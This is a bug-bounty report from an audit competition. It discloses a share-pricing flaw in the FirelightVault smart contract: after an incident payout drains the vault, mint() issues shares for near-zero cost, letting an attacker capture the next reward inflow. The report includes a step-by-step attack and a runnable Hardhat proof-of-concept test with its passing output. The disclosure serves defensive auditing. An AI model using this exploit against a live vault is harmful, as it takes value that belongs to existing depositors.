# 88631 sc medium firelightvault mint mints shares at zero price after an incident payout drains the vault breaking the erc4626 share price invariant and enabling capture of the recovery inflow

**Submitted on Aug 14th 2026 at 08:58:07 UTC by @Galliform78689 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88631
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Paying out covered losses is the core, designed purpose of FirelightVault: in a severe incident, `IncidentManager` calls `vault.payout()` and the vault pays out assets up to the capture-period exposure cap. When such a payout drains the active assets (`totalAssets() == 0` while shares remain outstanding), `mint()` prices shares at \~0 because it has no minimum-value guard — breaking the ERC4626 invariant that shares can only be minted in exchange for a meaningful amount of assets. An attacker then mints a large position for \~1000 wei and captures the next reward inflow, so the funds that should accrue to existing holders are instead withdrawn by the attacker.

## Vulnerability Details

### 1. The invariant that is broken

`mint()` (FirelightVault.sol:682-704) prices shares via `_previewTotals` -> `_convertToAssetsTotals` (FirelightVault.sol:1067-1077):

```solidity
shares.mulDiv(totalAssets + 1, totalSupply + 10 ** _decimalsOffset(), Math.Rounding.Ceil)
```

`_decimalsOffset()` is `0` (same-decimals asset). When `totalAssets() == 0` and `totalSupply() == S > 0`, minting `M` shares costs:

```
ceil(M * 1 / (S + 1)) wei
```

which is **sub-wei per share** — effectively zero. The protocol defends the deposit side of this boundary: `deposit()` reverts when the minted shares round to zero (`InvalidAmount`), and the donation tests treat a zero-price deposit as a rejected dust deposit. `mint()` has **no equivalent minimum-value guard** — it only validates `shares != 0`, pause/incident state, and blocklist. This is an invariant violation: the share price can be reset to \~0 and shares can be created for \~nothing, which the vault's own conversion and deposit paths assume cannot happen.

### 2. The precondition is a designed, routine protocol operation

`totalAssets()` is defined as:

```solidity
super.totalAssets() - pendingWithdrawAssets
```

`payout()` (FirelightVault.sol:892) is the vault's incident-payout entry point: for a confirmed incident, `IncidentManager._executePayout` calls it and the vault pays out covered losses up to the period-start exposure cap, drawing from active assets and still-exposed withdrawals. A payout transfers assets out and only updates the total-assets checkpoint; it **never burns shares**. A severe incident — an insurance protocol's core scenario — can therefore pay out essentially all active assets, leaving `totalAssets() == 0` while `totalSupply() > 0`. The drained state is not an admin abuse or a fabricated condition; it is the tail outcome of a legitimate, designed flow that the protocol must be able to survive.

### 3. The concrete attack

{% stepper %}
{% step %}

## Mint near-free shares

Once the drained state exists, the attacker calls `mint(M)` and receives `M` shares for ≈ `M / (S + 1)` wei (1000 wei for `1e9` shares in the reproduction).
{% endstep %}

{% step %}

## Wait for normal protocol recovery

The protocol continues operating normally: `VaultRewardDistributor` forwards premium proceeds straight into the vault, and new deposits restore the share price.
{% endstep %}

{% step %}

## Withdraw real assets

The attacker's near-free shares participate in `redeem`/`withdraw` like any other shares and convert into real assets.

The attacker captures the recovery inflow at negligible cost; existing holders are diluted and lose that value.
{% endstep %}
{% endstepper %}

## Impact Details

* **Reproduced numbers (test executed against commit `bd98a029…`):** fresh vault with a 1-unit deposit -> a legitimate full payout drains it (`totalAssets() == 0`, `totalSupply() == 1e6`) -> attacker mints `1e9` shares for **1000 wei** -> a **1000-unit** reward inflow arrives -> attacker's `maxWithdraw` ≈ **999 units** (about 999,000,998 wei; more than half the reward and > 999,000x the cost). The legitimate holder ends with ≈ 1 unit instead of the ≈ 1001 units they would have received without the attack — the recovery inflow is effectively taken by the attacker.
* **Selected impact:** **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield** (Critical tier per the program matrix).
* **Severity note:** the underlying defect is a broken ERC4626 share-pricing invariant with a missing minimum-mint guard; exploitation additionally requires the vault to have been drained by a legitimate incident payout. Because that precondition is a real but tail-case protocol event that the attacker cannot trigger themselves, an expected final rating is **Medium** rather than Critical, and the report should be read with that precondition in mind.

## References

* [`mint()` — FirelightVault.sol#L682-L704](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L682-L704)
* [`_convertToAssetsTotals` / `_convertToSharesTotals` — FirelightVault.sol#L1058-L1077](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L1058-L1077)
* [`_depositFunds` (no minimum-asset check) — FirelightVault.sol#L976-L990](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L976-L990)
* [`payout()` (drains active assets without burning shares) — FirelightVault.sol#L892](https://github.com/immunefi-team/audit-comp-firelight/blob/v1_audit_ready/contracts/core/FirelightVault.sol#L892)
* Audit commit tested: `bd98a0292dd602e9bbfa94551862c6af6933b5f4`

## Proof of Concept

## Step-by-step

{% stepper %}
{% step %}

## Deploy and deposit

Deploy a fresh FirelightVault (6-decimal asset, `604800s` periods, deposit limit 50,000 units). A depositor deposits **1 unit** in period 0 -> `totalAssets() = 1 unit`, `totalSupply() = 1e6` shares.
{% endstep %}

{% step %}

## Advance one period

Advance one period (`time.increase(604800)`) so the payout window opens.
{% endstep %}

{% step %}

## Drain active assets through a legitimate payout

A confirmed incident is paid out through the protocol's normal flow: `PAYOUT_ROLE` (production caller: `IncidentManager`) calls `payout(receiver, 1 unit, captureTimestamp = period-1 start)` -> the vault transfers out its entire active balance: `totalAssets() == 0`, `totalSupply() > 0`.
{% endstep %}

{% step %}

## Mint near-free shares

The attacker calls `mint(1e9 shares, attacker)` -> the token balance decreases by **1000 wei**; the attacker now holds `1e9` shares.
{% endstep %}

{% step %}

## Forward rewards

The protocol forwards **1000 units** of rewards into the vault by direct transfer (the same path `VaultRewardDistributor` uses).
{% endstep %}

{% step %}

## Confirm captured value

`attacker.maxWithdraw` ≈ 999 units — asserted `> REWARD/2` and `> cost * 1000` — confirming the attacker captures the recovery inflow at negligible cost.
{% endstep %}

{% step %}

## Withdraw through the normal claim path

The attacker's withdrawal goes through the standard delayed claim path (claimable after the usual period delay); no special handling is required.
{% endstep %}
{% endstepper %}

## Runnable PoC (Hardhat test)

Place the file at `test/ldpf/poc_9a30318b.js` in the audited repository and run:

```bash
npx hardhat test test/ldpf/poc_9a30318b.js
```

```js
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { expect } = require('chai')
const { ethers } = require('hardhat')
const { deployVault } = require('../setup/fixtures.js')

// PoC: after a legitimate incident payout drains the active assets
// (totalAssets() == 0 while shares remain outstanding), mint() prices shares at
// ~1 wei each. The attacker mints a large position for ~1000 wei and captures
// the next reward inflow. Only public entry points are used; the drained state
// is produced by the protocol's own payout() (production caller: IncidentManager).
describe('PoC: near-free share minting after payout drains the vault (FirelightVault)', function () {
  const DECIMALS = 6
  const ONE = 10n ** BigInt(DECIMALS)              // 1 unit deposit
  const REWARD = 1000n * 10n ** BigInt(DECIMALS)   // 1000 units inflow
  const MINT_SHARES = 10n ** 9n                    // 1e9 shares
  const PERIOD = 604800n                           // 1 week

  it('test_near_free_mint_after_drain', async function () {
    const { token_contract, firelight_vault, users, utils, payout_signer, payout_receiver } = await loadFixture(
      deployVault.bind(null, { decimals: DECIMALS })
    )
    const depositor = users[0]
    const attacker = users[1]
    await utils.mintAndApprove(ONE, depositor)
    await utils.mintAndApprove(REWARD, attacker)

    // 1) Legitimate deposit in period 0 (records the period-start snapshot).
    await firelight_vault.connect(depositor).deposit(ONE, depositor.address)
    expect(await firelight_vault.totalAssets()).to.equal(ONE)
    expect(await firelight_vault.totalSupply()).to.equal(ONE)

    // 2) Advance one period so the payout window opens (waiting is real).
    await time.increase(PERIOD)
    const block = await ethers.provider.getBlock('latest')
    const captureTimestamp = BigInt(block.timestamp)

    // 3) A legitimate incident payout (IncidentManager in production) drains the vault.
    await firelight_vault.connect(payout_signer).payout(payout_receiver.address, ONE, captureTimestamp)
    expect(await firelight_vault.totalAssets()).to.equal(0n)
    expect(await firelight_vault.totalSupply()).to.be.gt(0n)

    // 4) Attacker mints 1e9 shares for ~1000 wei.
    const before = await token_contract.balanceOf(attacker.address)
    await firelight_vault.connect(attacker).mint(MINT_SHARES, attacker.address)
    const after = await token_contract.balanceOf(attacker.address)
    const cost = before - after
    expect(cost).to.be.lte(1000n)

    // 5) Rewards are forwarded into the vault (VaultRewardDistributor path).
    await token_contract.mintTo(firelight_vault.target, REWARD)

    // 6) The near-free shares now convert into real value.
    const attackerAssets = await firelight_vault.maxWithdraw(attacker.address)
    expect(attackerAssets).to.be.gt(REWARD / 2n)
    expect(attackerAssets).to.be.gt(cost * 1000n)
  })
})
```

## Observed result

```
PoC: near-free share minting after payout drains the vault (FirelightVault)
  ✔ test_near_free_mint_after_drain (918ms)

1 passing (919ms)
```

The test was executed twice from a clean state against the audited commit; both runs pass. It uses only public entry points, and the drained state is produced by the protocol's own `payout()` (a legitimate incident flow), not by impersonating roles or overriding state.
